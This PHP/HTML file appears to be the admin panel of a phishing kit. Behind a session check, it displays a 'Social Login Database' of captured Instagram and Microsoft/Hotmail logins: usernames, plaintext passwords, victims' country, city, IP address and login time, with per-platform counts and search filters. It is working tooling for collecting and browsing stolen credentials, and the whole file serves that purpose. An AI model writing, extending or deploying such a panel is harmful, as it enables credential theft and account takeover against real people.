<?php
session_start();

// Check if user is authenticated
if (!isset($_SESSION['admin_authenticated']) || $_SESSION['admin_authenticated'] !== true) {
    // Redirect to login page if not authenticated
    header("Location: admin_login.php");
    exit;
}

require 'get_user_info.php'; // Include the script to fetch user data

// Filter users by platform
$instagramUsers = [];
$microsoftUsers = [];

foreach ($users as $user) {
    if (strpos($user['username'], '(IG)') !== false) {
        $instagramUsers[] = $user;
    } elseif (strpos($user['username'], '(hotmail)') !== false || strpos($user['username'], '(MS)') !== false) {
        $microsoftUsers[] = $user;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Database</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="database_styles.css">
</head>
<body>
    <div class="container">
        <div class="dashboard-header">
            <h1><i class="fas fa-database"></i> Social Login Database</h1>
            <div class="header-actions">
                <span id="current-time"></span>
                <a href="logout.php" class="btn-logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
            </div>
        </div>
        
        <div class="dashboard-stats">
            <div class="stat-card">
                <h3>Total Users</h3>
                <div class="stat-value"><?php echo count($users); ?></div>
            </div>
            <div class="stat-card">
                <h3>Instagram Users</h3>
                <div class="stat-value"><?php echo count($instagramUsers); ?></div>
            </div>
            <div class="stat-card">
                <h3>Microsoft Users</h3>
                <div class="stat-value"><?php echo count($microsoftUsers); ?></div>
            </div>
            <div class="stat-card">
                <h3>Latest Login</h3>
                <div class="stat-value" style="font-size: 18px;">
                    <?php 
                    if (!empty($users)) {
                        echo date('M d, H:i', strtotime($users[0]['login_time']));
                    } else {
                        echo "N/A";
                    }
                    ?>
                </div>
            </div>
        </div>
        
        <!-- Instagram Users Section -->
        <div class="platform-container instagram-container">
            <div class="platform-header">
                <img src="./assets/ig.png" alt="Instagram" height="40">
                <h2>Instagram User Logins</h2>
        </div>
        
        <div class="data-table-container">
            <div class="table-header">
                    <h2><i class="fab fa-instagram"></i> Instagram Login Information</h2>
                <div class="search-bar">
                        <input type="text" id="instagramSearchInput" placeholder="Search Instagram users...">
                    <i class="fas fa-search"></i>
                    </div>
                </div>
                
                <?php if (!empty($instagramUsers)): ?>
                    <div class="responsive-table">
                        <table id="instagramTable">
                            <thead>
                                <tr>
                                    <th>Username</th>
                                    <th>Password</th>
                                    <th>Country</th>
                                    <th>City</th>
                                    <th>Continent</th>
                                    <th>IP Address</th>
                                    <th>Login Time</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($instagramUsers as $user): ?>
                                    <tr>
                                        <td class="username"><?php echo htmlspecialchars(str_replace('(IG)', '', $user['username'])); ?></td>
                                        <td class="password"><?php echo htmlspecialchars($user['password']); ?></td>
                                        <td><?php echo htmlspecialchars($user['country']); ?></td>
                                        <td><?php echo htmlspecialchars($user['city']); ?></td>
                                        <td><?php echo htmlspecialchars($user['continent']); ?></td>
                                        <td><?php echo htmlspecialchars($user['ip_address']); ?></td>
                                        <td><?php echo htmlspecialchars($user['login_time']); ?></td>
                                    </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                    
                    <div class="table-footer">
                        <div>Showing <span id="instagram-shown-count"><?php echo count($instagramUsers); ?></span> of <?php echo count($instagramUsers); ?> Instagram users</div>
                    </div>
                <?php else: ?>
                    <div class="empty-state">
                        <i class="fab fa-instagram"></i>
                        <h3>No Instagram User Data Available</h3>
                        <p>There are no Instagram users in the database yet.</p>
                    </div>
                <?php endif; ?>
            </div>
        </div>
        
        <!-- Microsoft Users Section -->
        <div class="platform-container microsoft-container">
            <div class="platform-header">
                <img src="./assets/microsoft.svg" alt="Microsoft" height="40">
                <h2>Microsoft User Logins</h2>
            </div>
            
            <div class="data-table-container">
                <div class="table-header">
                    <h2><i class="fab fa-microsoft"></i> Microsoft Login Information</h2>
                    <div class="search-bar">
                        <input type="text" id="microsoftSearchInput" placeholder="Search Microsoft users...">
                        <i class="fas fa-search"></i>
                    </div>
                </div>
                
                <?php if (!empty($microsoftUsers)): ?>
                <div class="responsive-table">
                        <table id="microsoftTable">
                        <thead>
                            <tr>
                                <th>Username</th>
                                <th>Password</th>
                                <th>Country</th>
                                <th>City</th>
                                <th>Continent</th>
                                <th>IP Address</th>
                                <th>Login Time</th>
                            </tr>
                        </thead>
                        <tbody>
                                <?php foreach ($microsoftUsers as $user): ?>
                                <tr>
                                        <td class="username"><?php echo htmlspecialchars(str_replace(['(hotmail)', '(MS)'], '', $user['username'])); ?></td>
                                        <td class="password"><?php echo htmlspecialchars($user['password']); ?></td>
                                    <td><?php echo htmlspecialchars($user['country']); ?></td>
                                    <td><?php echo htmlspecialchars($user['city']); ?></td>
                                    <td><?php echo htmlspecialchars($user['continent']); ?></td>
                                    <td><?php echo htmlspecialchars($user['ip_address']); ?></td>
                                    <td><?php echo htmlspecialchars($user['login_time']); ?></td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
                
                <div class="table-footer">
                        <div>Showing <span id="microsoft-shown-count"><?php echo count($microsoftUsers); ?></span> of <?php echo count($microsoftUsers); ?> Microsoft users</div>
                </div>
            <?php else: ?>
                <div class="empty-state">
                        <i class="fab fa-microsoft"></i>
                        <h3>No Microsoft User Data Available</h3>
                        <p>There are no Microsoft users in the database yet.</p>
                </div>
            <?php endif; ?>
            </div>
        </div>
    </div>
    
    <script>
        // Display current time
        function updateClock() {
            const now = new Date();
            document.getElementById('current-time').textContent = now.toLocaleDateString() + ' ' + 
                now.toLocaleTimeString();
        }
        
        // Search functionality for Instagram table
        document.getElementById('instagramSearchInput').addEventListener('keyup', function() {
            filterTable('instagramTable', 'instagram-shown-count', this.value);
        });
        
        // Search functionality for Microsoft table
        document.getElementById('microsoftSearchInput').addEventListener('keyup', function() {
            filterTable('microsoftTable', 'microsoft-shown-count', this.value);
        });
        
        // Common filter function for both tables
        function filterTable(tableId, countId, searchText) {
            searchText = searchText.toLowerCase();
            const table = document.getElementById(tableId);
            if (!table) return;
            
            const rows = table.getElementsByTagName('tbody')[0].getElementsByTagName('tr');
            let visibleCount = 0;
            
            for (let i = 0; i < rows.length; i++) {
                const rowText = rows[i].textContent.toLowerCase();
                if (rowText.includes(searchText)) {
                    rows[i].style.display = '';
                    visibleCount++;
                } else {
                    rows[i].style.display = 'none';
                }
            }
            
            document.getElementById(countId).textContent = visibleCount;
        }
        
        // Initial clock update and start interval
        updateClock();
        setInterval(updateClock, 1000);
    </script>
</body>
</html> 